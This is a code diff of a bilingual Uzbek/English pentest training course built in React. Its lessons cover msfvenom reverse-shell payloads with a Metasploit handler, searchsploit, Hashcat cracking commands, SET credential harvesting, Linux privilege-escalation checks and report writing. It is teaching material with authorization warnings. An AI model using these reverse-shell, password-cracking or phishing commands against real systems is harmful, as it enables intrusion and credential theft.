+    React.createElement(H2,{num:"§2"},t(lang,"Payload → shell oqimi","Payload → shell flow")),
+    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"msfvenom + handler",en:"msfvenom + handler"},steps:[
+      {icon:"🧪",text:{uz:"msfvenom bilan payload yaratish (LHOST/LPORT)",en:"Generate a payload with msfvenom (LHOST/LPORT)"}},
+      {icon:"👂",text:{uz:"Metasploit'da handler (tinglovchi) sozlash",en:"Set up a handler (listener) in Metasploit"}},
+      {icon:"▶",text:{uz:"Nishonda payload ishga tushadi",en:"The payload runs on the target"}},
+      {icon:"🔗",text:{uz:"Teskari ulanish hujumchiga qaytadi",en:"A reverse connection returns to the attacker"}},
+      {icon:"🐚",text:{uz:"Meterpreter/shell sessiyasi ochiladi",en:"A Meterpreter/shell session opens"}},
+    ]}),
+    React.createElement(Terminal,null,"msfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe\n\n# handler:\nuse exploit/multi/handler\nset LHOST 10.0.0.10\nrun"),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"LHOST — sizning (hujumchi) IP, LPORT — tinglayotgan port. Bunday yuklarni faqat laboratoriya yoki ruxsat berilgan nishonlarda sinang.","LHOST is your (attacker) IP, LPORT the listening port. Only test such payloads in a lab or on authorized targets.")),
+    React.createElement(Quiz,{q:{uz:"msfvenom da LHOST nimani bildiradi?",en:"In msfvenom, what does LHOST specify?"},opts:[{uz:"Nishonning IP si",en:"The target's IP"},{uz:"Hujumchining (tinglovchining) IP si",en:"The attacker's (listener's) IP"},{uz:"Fayl nomi",en:"A file name"},{uz:"Payload turi",en:"The payload type"}],correct:1,exp:{uz:"LHOST — teskari ulanish qaytadigan manzil, ya'ni hujumchining IP si.",en:"LHOST is where the reverse connection returns — the attacker's IP."}}));
+}function LessonL23(){
   const lang=useLang();
   return React.createElement("section",null,
-    React.createElement(H2,{num:"§1"},t(lang,"Exploit-DB va searchsploit","Exploit-DB and searchsploit")),
-    React.createElement(P,null,t(lang,
-      "Exploit-DB — dunyodagi eng katta ochiq ekspluatatsiya arxivi. searchsploit esa uning nusxasini Kali'da oflayn qidirish imkonini beradigan vosita. Nishon dasturi va versiyasini bilganingizdan so'ng, unga tegishli tayyor ekspluatatsiyani shu yerdan topasiz.",
-      "Exploit-DB is the world's largest public archive of exploits. searchsploit is the tool that lets you search a local copy of it offline in Kali. Once you know the target's software and version, you find a matching ready-made exploit here."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Qidirish","Searching")),
-    React.createElement(Terminal,null,
-      "# Dastur nomi bo'yicha qidirish\nsearchsploit apache 2.4\n\n# Aniq qidiruv (nomida)\nsearchsploit -t wordpress\n\n# Ma'lumotlar bazasini yangilash\nsearchsploit -u"
-    ),
-    React.createElement(H2,{num:"§3"},t(lang,"Ekspluatatsiyani ko'rish va nusxalash","Viewing and copying an exploit")),
-    React.createElement(Terminal,null,
-      "# Ekspluatatsiya kodini o'qish\nsearchsploit -x php/webapps/50123.php\n\n# Uni joriy katalogga nusxalash\nsearchsploit -m 50123\n\n# Endi kodni tahlil qilib, sozlab ishga tushirasiz"
-    ),
-    React.createElement(InfoBox,{color:"var(--c-warn)"},
-      React.createElement("strong",null,"⚠ "),
-      t(lang,"Internetdan olingan ekspluatatsiya kodini ko'r-ko'rona ishga tushirmang — avval uni o'qib, nima qilishini tushuning. Ba'zi \"ekspluatatsiyalar\" aslida sizning mashinangizga qarshi zararli kod bo'lishi mumkin.",
-        "Never blindly run exploit code from the internet — read it first and understand what it does. Some 'exploits' are actually malicious code aimed at your own machine.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"searchsploit asosan nima uchun ishlatiladi?",en:"What is searchsploit mainly used for?"},
-      opts:[{uz:"Portlarni skanerlash",en:"Scanning ports"},{uz:"Ma'lum dastur/versiyaga tayyor ekspluatatsiyalarni topish",en:"Finding ready-made exploits for a known software/version"},{uz:"Parollarni buzish",en:"Cracking passwords"},{uz:"Trafikni tinglash",en:"Sniffing traffic"}],
-      correct:1,
-      exp:{uz:"searchsploit Exploit-DB ning lokal nusxasidan ma'lum dastur va versiyaga mos ekspluatatsiyalarni oflayn qidiradi.",en:"searchsploit searches a local copy of Exploit-DB offline for exploits matching a known software and version."}
-    })
-  );
-}
-
-// ── L26: Hashcat ──────────────────────────────────────────────
-function LessonL26(){
+    React.createElement(NetAnimStyle),
+    React.createElement(H2,{num:"§1"},t(lang,"searchsploit va Exploit-DB","searchsploit and Exploit-DB")),
+    React.createElement(P,null,t(lang,"Exploit-DB — dunyodagi eng katta ochiq ekspluatatsiya arxivi. searchsploit uning nusxasini Kali'da oflayn qidirish imkonini beradi. Nishon dasturi va versiyasini bilgach, unga mos tayyor ekspluatatsiyani topasiz.","Exploit-DB is the world's largest public exploit archive. searchsploit searches a local copy offline in Kali. Once you know the target's software and version, you find a matching ready-made exploit.")),
+    React.createElement(H2,{num:"§2"},t(lang,"Topish oqimi","The find flow")),
+    React.createElement(FlowSteps,{title:{uz:"Ekspluatatsiyani topish",en:"Finding an exploit"},steps:[
+      {icon:"🔎",text:{uz:"searchsploit apache 2.4 — nom+versiya bo'yicha qidirish",en:"searchsploit apache 2.4 — search by name+version"}},
+      {icon:"👁",text:{uz:"searchsploit -x ... — kodni o'qish",en:"searchsploit -x ... — read the code"}},
+      {icon:"📋",text:{uz:"searchsploit -m ... — joriy katalogga nusxalash",en:"searchsploit -m ... — copy to the current folder"}},
+      {icon:"🔧",text:{uz:"Kodni sozlab, ehtiyotkorlik bilan ishga tushirish",en:"Tune the code and run it carefully"}},
+    ]}),
+    React.createElement(Terminal,null,"searchsploit wordpress 5.2\nsearchsploit -x php/webapps/50123.php   # o'qish\nsearchsploit -m 50123                   # nusxalash"),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Internetdan olingan ekspluatatsiya kodini ko'r-ko'rona ishga tushirmang — avval o'qib, nima qilishini tushuning.","Never blindly run exploit code from the internet — read it first and understand what it does.")),
+    React.createElement(Quiz,{q:{uz:"searchsploit asosan nima uchun ishlatiladi?",en:"What is searchsploit mainly used for?"},opts:[{uz:"Portlarni skanerlash",en:"Scanning ports"},{uz:"Ma'lum dastur/versiyaga tayyor ekspluatatsiyalarni topish",en:"Finding ready exploits for a known software/version"},{uz:"Parollarni buzish",en:"Cracking passwords"},{uz:"Trafikni tinglash",en:"Sniffing traffic"}],correct:1,exp:{uz:"searchsploit Exploit-DB lokal nusxasidan ma'lum dastur/versiyaga mos ekspluatatsiyalarni oflayn qidiradi.",en:"searchsploit searches a local Exploit-DB offline for exploits matching a known software/version."}}));
+}function LessonL26(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"Hashcat nima?","What is Hashcat?")),
-    React.createElement(P,null,t(lang,
-      "Hashcat — dunyodagi eng tezkor parol hash buzuvchi. U GPU (video karta) quvvatidan foydalanib, sekundiga milliardlab parolni sinaydi. John the Ripper kabi oflayn ishlaydi, lekin katta hajmdagi ishlar uchun ancha tezroq.",
-      "Hashcat is the world's fastest password-hash cracker. Using GPU (graphics card) power, it tries billions of passwords per second. Like John the Ripper it works offline, but is far faster for large jobs."
-    )),
+    React.createElement(P,null,t(lang,"Hashcat — dunyodagi eng tezkor parol hash buzuvchi. GPU quvvatidan foydalanib sekundiga milliardlab parolni sinaydi. John kabi oflayn, lekin katta ishlar uchun ancha tezroq.","Hashcat is the world's fastest password-hash cracker. Using GPU power, it tries billions of passwords per second. Like John it's offline, but far faster for large jobs.")),
     React.createElement(H2,{num:"§2"},t(lang,"Hujum rejimlari","Attack modes")),
-    React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(200px,1fr))",gap:10,margin:"12px 0 16px"}},
-      [["-a 0",t(lang,"Lug'at hujumi (wordlist)","Dictionary (wordlist)")],
-       ["-a 3",t(lang,"Brute-force (maska bilan)","Brute-force (mask)")],
-       ["-a 6",t(lang,"Wordlist + maska","Wordlist + mask")],
-       ["-a 1",t(lang,"Kombinatsiya (ikki wordlist)","Combinator (two wordlists)")]].map((x,i)=>
-        React.createElement("div",{key:i,style:{background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,padding:"11px 14px"}},
-          React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)"}},x[0]),
-          React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",marginTop:4}},x[1])))
-    ),
+    React.createElement(LayerStack,{layers:[
+      {n:"-a 0",name:t(lang,"Lug'at","Dictionary"),color:"#69db7c",desc:{uz:"Wordlist bilan (rockyou.txt).",en:"With a wordlist (rockyou.txt)."}},
+      {n:"-a 3",name:t(lang,"Brute-force (maska)","Brute-force (mask)"),color:"#ff3a5e",desc:{uz:"?a?a?a... belgilar kombinatsiyasi.",en:"?a?a?a... character combinations."}},
+      {n:"-a 6",name:t(lang,"Wordlist + maska","Wordlist + mask"),color:"#4dabf7",desc:{uz:"Lug'at so'ziga qo'shimchalar.",en:"Suffixes appended to wordlist words."}},
+    ]}),
     React.createElement(H2,{num:"§3"},t(lang,"Foydalanish","Usage")),
-    React.createElement(Terminal,null,
-      "# Lug'at hujumi (-m = hash turi, 0 = MD5)\nhashcat -m 0 -a 0 hashes.txt rockyou.txt\n\n# NTLM hashlar (-m 1000)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt\n\n# Maska hujumi: 8 belgi, harf+raqam\nhashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a\n\n# Buzilganlarni ko'rish\nhashcat -m 0 hashes.txt --show"
-    ),
-    React.createElement(InfoBox,{color:"var(--accent)"},
-      React.createElement("strong",null,t(lang,"Hash turini aniqlash: ","Identifying the hash type: ")),
-      t(lang,"To'g'ri -m qiymatini tanlash muhim. hashid yoki hash-identifier vositalari hash turini aniqlashga yordam beradi. Hashcat wiki'da barcha -m raqamlari ro'yxati bor.",
-        "Choosing the right -m value is important. The hashid or hash-identifier tools help determine the hash type. The Hashcat wiki lists all -m numbers.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"Hashcat John the Ripper'dan asosiy farqi nimada?",en:"What is Hashcat's main difference from John the Ripper?"},
-      opts:[{uz:"U onlayn ishlaydi",en:"It works online"},{uz:"U GPU quvvatidan foydalanib ancha tezroq",en:"It uses GPU power and is much faster"},{uz:"U faqat MD5 buzadi",en:"It only cracks MD5"},{uz:"U parol yaratadi",en:"It creates passwords"}],
-      correct:1,
-      exp:{uz:"Hashcat GPU'dan foydalanib sekundiga milliardlab parolni sinaydi — bu uni katta ishlar uchun John'dan ancha tezroq qiladi. Ikkalasi ham oflayn.",en:"Hashcat leverages the GPU to try billions of passwords per second, making it much faster than John for large jobs. Both are offline."}
-    })
-  );
-}
-
-// ── L28: Social Engineering (SET) ─────────────────────────────
-function LessonL28(){
+    React.createElement(Terminal,null,"hashcat -m 0 -a 0 hashes.txt rockyou.txt    # MD5\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt   # NTLM\nhashcat -m 0 hashes.txt --show"),
+    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"To'g'ri -m (hash turi) qiymatini tanlash muhim. hashid vositasi hash turini aniqlashga yordam beradi.","Choosing the right -m (hash type) matters. The hashid tool helps identify the hash type.")),
+    React.createElement(Quiz,{q:{uz:"Hashcat ning John dan asosiy farqi nimada?",en:"Hashcat's main difference from John?"},opts:[{uz:"U onlayn ishlaydi",en:"It works online"},{uz:"U GPU'dan foydalanib ancha tezroq",en:"It uses the GPU and is much faster"},{uz:"U faqat MD5 buzadi",en:"It only cracks MD5"},{uz:"U parol yaratadi",en:"It creates passwords"}],correct:1,exp:{uz:"Hashcat GPU'dan foydalanib sekundiga milliardlab parolni sinaydi — katta ishlar uchun John'dan tezroq. Ikkalasi oflayn.",en:"Hashcat leverages the GPU for billions of tries per second — faster than John for big jobs. Both offline."}}));
+}function LessonL28(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"Ijtimoiy muhandislik va SET","Social engineering and SET")),
-    React.createElement(P,null,t(lang,
-      "Ijtimoiy muhandislik — texnik zaifliklar emas, balki insonlarni aldash orqali hujum qilish. Eng kuchli himoya ham bitta ishonuvchan xodim tufayli buziladi. SET (Social-Engineer Toolkit) — bunday hujum stsenariylarini (phishing, soxta saytlar) yaratish uchun Kali vositasi.",
-      "Social engineering means attacking by deceiving people rather than exploiting technical flaws. Even the strongest defense breaks because of one trusting employee. SET (Social-Engineer Toolkit) is a Kali tool for building such attack scenarios (phishing, fake sites)."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Keng tarqalgan texnikalar","Common techniques")),
-    React.createElement("div",{style:{marginBottom:16}},
-      [[t(lang,"Phishing","Phishing"),t(lang,"Soxta email orqali ma'lumot yoki parol o'g'irlash","Stealing info or passwords via fake email")],
-       [t(lang,"Pretexting","Pretexting"),t(lang,"Ishonchli yolg'on stsenariy o'ylab topish (masalan IT xodimi)","Inventing a believable false scenario (e.g. IT staff)")],
-       [t(lang,"Baiting","Baiting"),t(lang,"Qiziqtiruvchi 'o'lja' (masalan zararli USB) qoldirish","Leaving an enticing 'bait' (e.g. a malicious USB)")],
-       [t(lang,"Credential Harvesting","Credential Harvesting"),t(lang,"Haqiqiy saytning soxta nusxasi bilan login o'g'irlash","Stealing logins with a fake clone of a real site")]].map((x,i)=>
-        React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
-          React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:150}},x[0]),
-          React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.5}},x[1])))
-    ),
-    React.createElement(Terminal,null,
-      "# SET'ni ishga tushirish\nsudo setoolkit\n\n# Menyu: 1) Social-Engineering Attacks\n#        2) Website Attack Vectors\n#        3) Credential Harvester Method"
-    ),
-    React.createElement(InfoBox,{color:"var(--c-warn)"},
-      React.createElement("strong",null,"⚠ "),
-      t(lang,"Ijtimoiy muhandislik hujumlari faqat rasmiy, yozma ruxsat berilgan pentest doirasida (masalan tashkilotning o'z xodimlarini sinash) o'tkazilishi mumkin. Aks holda bu firibgarlik va jinoyat hisoblanadi.",
-        "Social engineering attacks may only be conducted within a formal, written-authorized pentest scope (e.g. testing an organization's own employees). Otherwise it is fraud and a crime.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"Ijtimoiy muhandislik hujumi nimaga asoslanadi?",en:"What does a social engineering attack rely on?"},
-      opts:[{uz:"Dasturiy zaifliklarga",en:"Software vulnerabilities"},{uz:"Insonlarni aldash va ishonchdan foydalanishga",en:"Deceiving people and abusing trust"},{uz:"Tarmoq portlariga",en:"Network ports"},{uz:"Shifrlash xatolariga",en:"Encryption flaws"}],
-      correct:1,
-      exp:{uz:"Ijtimoiy muhandislik texnik emas, insoniy omilga qaratilgan — u odamlarni aldab, maxfiy ma'lumot yoki kirish huquqini berishga undaydi.",en:"Social engineering targets the human factor, not the technical one — it tricks people into handing over sensitive info or access."}
-    })
-  );
-}
-
-// ── L29: Privilege escalation ─────────────────────────────────
-function LessonL29(){
+    React.createElement(P,null,t(lang,"Ijtimoiy muhandislik — texnik zaifliklar emas, insonlarni aldash orqali hujum. Eng kuchli himoya ham bitta ishonuvchan xodim tufayli buziladi. SET (Social-Engineer Toolkit) — bunday stsenariylarni yaratish uchun Kali vositasi.","Social engineering attacks by deceiving people rather than exploiting technical flaws. Even the strongest defense breaks because of one trusting employee. SET (Social-Engineer Toolkit) builds such scenarios in Kali.")),
+    React.createElement(H2,{num:"§2"},t(lang,"Phishing oqimi (misol)","Phishing flow (example)")),
+    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Credential harvesting",en:"Credential harvesting"},steps:[
+      {icon:"🎭",text:{uz:"Haqiqiy login sahifasining soxta nusxasi klonlanadi",en:"A fake clone of a real login page is created"}},
+      {icon:"📧",text:{uz:"Qurbonga ishonchli ko'rinuvchi havola yuboriladi",en:"A believable link is sent to the victim"}},
+      {icon:"⌨",text:{uz:"Qurbon login/parolni soxta sahifaga kiritadi",en:"The victim enters credentials on the fake page"}},
+      {icon:"🕳",text:{uz:"Ma'lumot hujumchiga yuboriladi (harvest)",en:"The data is sent to the attacker (harvested)"}},
+    ]}),
+    React.createElement(Terminal,null,"sudo setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Method"),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Ijtimoiy muhandislik hujumlari faqat rasmiy, yozma ruxsat berilgan pentest doirasida o'tkazilishi mumkin. Aks holda bu firibgarlik va jinoyat.","Social engineering attacks may only be run within a formal, written-authorized pentest. Otherwise it is fraud and a crime.")),
+    React.createElement(Quiz,{q:{uz:"Ijtimoiy muhandislik nimaga asoslanadi?",en:"What does social engineering rely on?"},opts:[{uz:"Dasturiy zaifliklarga",en:"Software vulnerabilities"},{uz:"Insonlarni aldash va ishonchdan foydalanishga",en:"Deceiving people and abusing trust"},{uz:"Tarmoq portlariga",en:"Network ports"},{uz:"Shifrlash xatolariga",en:"Encryption flaws"}],correct:1,exp:{uz:"Ijtimoiy muhandislik insoniy omilga qaratilgan — odamlarni aldab maxfiy ma'lumot yoki kirish berishga undaydi.",en:"Social engineering targets the human factor — tricking people into handing over secrets or access."}}));
+}function LessonL29(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"Imtiyozlarni oshirish nima?","What is privilege escalation?")),
-    React.createElement(P,null,t(lang,
-      "Imtiyozlarni oshirish (privesc) — tizimga oddiy foydalanuvchi sifatida kirgandan so'ng, root (Linux) yoki Administrator (Windows) huquqlarini qo'lga kiritish jarayoni. Ko'p hujumlar past imtiyozli kirish bilan boshlanadi; privesc esa to'liq nazoratni beradi.",
-      "Privilege escalation (privesc) is the process of gaining root (Linux) or Administrator (Windows) rights after entering a system as a normal user. Many attacks start with low-privilege access; privesc gives full control."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Linux privesc — tekshiruv nuqtalari","Linux privesc — check points")),
-    React.createElement(Terminal,null,
-      "# Menda qanday sudo huquqlari bor?\nsudo -l\n\n# SUID o'rnatilgan fayllar (GTFOBins bilan solishtiring)\nfind / -perm -4000 -type f 2>/dev/null\n\n# Yozish mumkin bo'lgan cron ishlari\nls -la /etc/cron*\n\n# Kernel versiyasi (ma'lum ekspluatatsiya bormi?)\nuname -a"
-    ),
-    React.createElement(H2,{num:"§3"},t(lang,"Avtomatlashtirilgan vositalar","Automated tools")),
-    React.createElement(Terminal,null,
-      "# LinPEAS — Linux privesc tekshiruvchi\n./linpeas.sh\n\n# Linux Exploit Suggester — kernel ekspluatatsiyalarini taklif qiladi\n./linux-exploit-suggester.sh\n\n# Windows uchun: winPEAS.exe, PowerUp.ps1"
-    ),
-    React.createElement(InfoBox,{color:"var(--accent)"},
-      React.createElement("strong",null,t(lang,"GTFOBins: ","GTFOBins: ")),
-      t(lang,"gtfobins.github.io — SUID yoki sudo huquqi bilan ishlaydigan oddiy dasturlarni (vim, find, less) qanday qilib root olishga aylantirish mumkinligini ko'rsatuvchi bebaho ma'lumotnoma.",
-        "gtfobins.github.io — an invaluable reference showing how ordinary programs (vim, find, less) with SUID or sudo rights can be turned into root access.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"Linux'da imtiyozlarni oshirishning eng birinchi tekshiruvi qaysi?",en:"What is one of the very first privilege-escalation checks on Linux?"},
-      opts:[{uz:"sudo -l bilan sudo huquqlarini ko'rish",en:"Checking sudo rights with sudo -l"},{uz:"Kompyuterni o'chirish",en:"Shutting down the computer"},{uz:"Brauzerni ochish",en:"Opening a browser"},{uz:"Fonni o'zgartirish",en:"Changing the wallpaper"}],
-      correct:0,
-      exp:{uz:"sudo -l joriy foydalanuvchiga qanday sudo huquqlari berilganini ko'rsatadi — bu ko'pincha root'ga tez yo'l ochadi.",en:"sudo -l shows what sudo rights the current user has — this often opens a quick path to root."}
-    })
-  );
-}
-
-// ── L30: Covering tracks & reporting ──────────────────────────
-function LessonL30(){
+    React.createElement(P,null,t(lang,"Imtiyozlarni oshirish (privesc) — tizimga oddiy foydalanuvchi sifatida kirgach, root (Linux) yoki Administrator huquqlarini qo'lga kiritish. Ko'p hujumlar past imtiyozli kirish bilan boshlanadi; privesc to'liq nazoratni beradi.","Privilege escalation (privesc) is gaining root (Linux) or Administrator rights after entering as a normal user. Many attacks start with low-privilege access; privesc gives full control.")),
+    React.createElement(H2,{num:"§2"},t(lang,"Linux privesc tekshiruvi","Linux privesc checks"),),
+    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Privesc yo'lini izlash",en:"Hunting a privesc path"},steps:[
+      {icon:"🔑",text:{uz:"sudo -l — qanday sudo huquqim bor?",en:"sudo -l — what sudo rights do I have?"}},
+      {icon:"🎫",text:{uz:"SUID fayllarni topish (GTFOBins bilan solishtirish)",en:"Find SUID files (compare with GTFOBins)"}},
+      {icon:"⏱",text:{uz:"Yozish mumkin cron ishlari va kernel versiyasi",en:"Writable cron jobs and the kernel version"}},
+      {icon:"🤖",text:{uz:"LinPEAS bilan avtomatik tekshirish",en:"Automate the checks with LinPEAS"}},
+    ]}),
+    React.createElement(Terminal,null,"sudo -l\nfind / -perm -4000 -type f 2>/dev/null\nuname -a\n./linpeas.sh"),
+    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"GTFOBins (gtfobins.github.io) — SUID/sudo huquqli oddiy dasturlarni (vim, find) qanday qilib root olishga aylantirishni ko'rsatadi.","GTFOBins (gtfobins.github.io) shows how ordinary programs (vim, find) with SUID/sudo can be turned into root.")),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Privesc texnikalarini faqat o'z laboratoriyangizda yoki ruxsat berilgan pentestda sinang.","Only test privesc techniques in your own lab or an authorized pentest.")),
+    React.createElement(Quiz,{q:{uz:"Linux privescning eng birinchi tekshiruvi qaysi?",en:"One of the very first Linux privesc checks?"},opts:[{uz:"sudo -l bilan sudo huquqlarini ko'rish",en:"Checking sudo rights with sudo -l"},{uz:"Kompyuterni o'chirish",en:"Shutting down the computer"},{uz:"Brauzerni ochish",en:"Opening a browser"},{uz:"Fonni o'zgartirish",en:"Changing the wallpaper"}],correct:0,exp:{uz:"sudo -l joriy foydalanuvchiga qanday sudo huquqlari berilganini ko'rsatadi — ko'pincha root'ga tez yo'l.",en:"sudo -l shows the current user's sudo rights — often a quick path to root."}}));
+}function LessonL30(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"Pentestning yakuniy bosqichi","The final phase of a pentest")),
-    React.createElement(P,null,t(lang,
-      "Haqiqiy hujumchilar izlarini yashiradi, lekin professional pentesterning eng muhim mahsuloti — hisobot. Sizning topilmalaringiz tushunarli, takrorlanadigan va tuzatib bo'ladigan tarzda hujjatlashtirilmasa, butun ish qiymatini yo'qotadi.",
-      "Real attackers cover their tracks, but a professional pentester's most important deliverable is the report. If your findings aren't documented in a clear, reproducible and fixable way, the entire engagement loses its value."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Izlarni yashirish (nazariy)","Covering tracks (conceptual)")),
-    React.createElement(P,null,t(lang,
-      "Hujumchilar loglarni tozalaydi va vaqt belgilarini o'zgartiradi. Mudofaachi (blue team) sifatida buni tushunish muhim — bu qaysi loglar himoyalanishi kerakligini ko'rsatadi. Pentestda esa siz bajargan barcha amallar hisobotda ochiq qayd etiladi, yashirilmaydi.",
-      "Attackers clear logs and alter timestamps. As a defender (blue team) it's important to understand this — it shows which logs must be protected. In a pentest, however, every action you take is openly recorded in the report, not hidden."
-    )),
-    React.createElement(Terminal,null,
-      "# Log fayllar odatda shu yerda (blue team bilishi shart):\n/var/log/auth.log     # kirish urinishlari\n/var/log/syslog       # umumiy tizim\n~/.bash_history       # kiritilgan buyruqlar\n\n# Himoya: loglarni markazlashtirilgan SIEM'ga uzatish"
-    ),
-    React.createElement(H2,{num:"§3"},t(lang,"Professional hisobot tuzilishi","Professional report structure")),
-    React.createElement("div",{style:{marginBottom:16}},
-      [["1. Executive Summary",t(lang,"Rahbariyat uchun texnik bo'lmagan qisqacha xulosa","Non-technical summary for management")],
-       ["2. Scope & Methodology",t(lang,"Nima test qilingani va qanday usulda","What was tested and how")],
-       ["3. Findings",t(lang,"Har bir zaiflik: tavsif, jiddiylik (CVSS), isbot","Each vuln: description, severity (CVSS), proof")],
-       ["4. Remediation",t(lang,"Har bir zaiflikni qanday tuzatish bo'yicha aniq tavsiyalar","Concrete fix recommendations per vuln")]].map((x,i)=>
-        React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
-          React.createElement("span",{style:{fontSize:13,fontWeight:700,color:"var(--accent)",minWidth:180}},x[0]),
-          React.createElement("span",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.5}},x[1])))
-    ),
-    React.createElement(InfoBox,{color:"var(--accent)"},
-      React.createElement("strong",null,t(lang,"Isbot (PoC): ","Proof of concept: ")),
-      t(lang,"Har bir topilma skrinshot, buyruq va qadamlar bilan hujjatlashtirilishi kerak, toki mijoz uni o'zi takrorlab, tuzatgach yana sinab ko'ra olsin. Hisobotsiz pentest — tugallanmagan pentest.",
-        "Every finding should be documented with screenshots, commands and steps so the client can reproduce it, fix it, then retest. A pentest without a report is an unfinished pentest.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"Professional pentesterning eng muhim yakuniy mahsuloti nima?",en:"What is a professional pentester's most important final deliverable?"},
-      opts:[{uz:"Buzilgan tizimlar soni",en:"The number of systems breached"},{uz:"Aniq, takrorlanadigan va tuzatib bo'ladigan hisobot",en:"A clear, reproducible and fixable report"},{uz:"O'g'irlangan parollar",en:"Stolen passwords"},{uz:"Tozalangan loglar",en:"Cleared logs"}],
-      correct:1,
-      exp:{uz:"Pentestning qiymati hisobotda — topilmalar tushunarli, isbotlangan va tuzatish tavsiyalari bilan hujjatlashtirilishi shart.",en:"The value of a pentest is in the report — findings must be documented clearly, with proof and remediation guidance."}
-    })
-  );
-}
-
-const root=ReactDOM.createRoot(document.getElementById("app"));
+    React.createElement(P,null,t(lang,"Haqiqiy hujumchilar izlarini yashiradi, lekin professional pentesterning eng muhim mahsuloti — hisobot. Topilmalaringiz tushunarli, takrorlanadigan va tuzatib bo'ladigan tarzda hujjatlashtirilmasa, butun ish qiymatini yo'qotadi.","Real attackers cover their tracks, but a professional pentester's most important deliverable is the report. If findings aren't documented in a clear, reproducible and fixable way, the whole engagement loses value.")),
+    React.createElement(H2,{num:"§2"},t(lang,"Professional hisobot tuzilishi","Professional report structure")),
+    React.createElement(FlowSteps,{color:"#69db7c",title:{uz:"Hisobot bosqichlari",en:"Report stages"},steps:[
+      {icon:"📄",text:{uz:"Executive Summary — rahbariyat uchun texnik bo'lmagan xulosa",en:"Executive Summary — non-technical summary for management"}},
+      {icon:"🎯",text:{uz:"Scope & Methodology — nima va qanday test qilingani",en:"Scope & Methodology — what was tested and how"}},
+      {icon:"🐞",text:{uz:"Findings — har zaiflik: tavsif, jiddiylik (CVSS), isbot",en:"Findings — each vuln: description, severity (CVSS), proof"}},
+      {icon:"🛠",text:{uz:"Remediation — qanday tuzatish bo'yicha tavsiyalar",en:"Remediation — how-to-fix recommendations"}},
+    ]}),
+    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Isbot (PoC): har topilma skrinshot, buyruq va qadamlar bilan hujjatlashtirilishi kerak — mijoz uni takrorlab, tuzatgach sinab ko'ra olsin. Hisobotsiz pentest — tugallanmagan pentest.","Proof (PoC): each finding should be documented with screenshots, commands and steps so the client can reproduce, fix, then retest. A pentest without a report is unfinished.")),
+    React.createElement(Quiz,{q:{uz:"Professional pentesterning eng muhim yakuniy mahsuloti nima?",en:"A professional pentester's most important final deliverable?"},opts:[{uz:"Buzilgan tizimlar soni",en:"The number of systems breached"},{uz:"Aniq, takrorlanadigan va tuzatib bo'ladigan hisobot",en:"A clear, reproducible and fixable report"},{uz:"O'g'irlangan parollar",en:"Stolen passwords"},{uz:"Tozalangan loglar",en:"Cleared logs"}],correct:1,exp:{uz:"Pentestning qiymati hisobotda — topilmalar tushunarli, isbotlangan va tuzatish tavsiyalari bilan hujjatlanishi shart.",en:"The value of a pentest is in the report — findings must be documented clearly, with proof and remediation."}}));
+}const root=ReactDOM.createRoot(document.getElementById("app"));
 root.render(React.createElement(App));
 
 /* ── Animated background particles (matches Windows module) ── */
